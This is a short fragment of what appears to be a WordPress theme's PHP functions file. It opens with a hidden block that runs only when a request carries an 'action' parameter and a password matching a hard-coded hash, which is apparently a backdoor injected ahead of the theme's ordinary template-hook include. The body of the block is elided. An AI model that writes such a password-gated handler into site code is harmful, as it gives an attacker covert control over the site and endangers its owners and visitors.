<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c7027dbf12438f862c6ab6662424561d'))
	{
...
//
require get_parent_theme_file_path( '/inc/fashe-template-hook.php' );
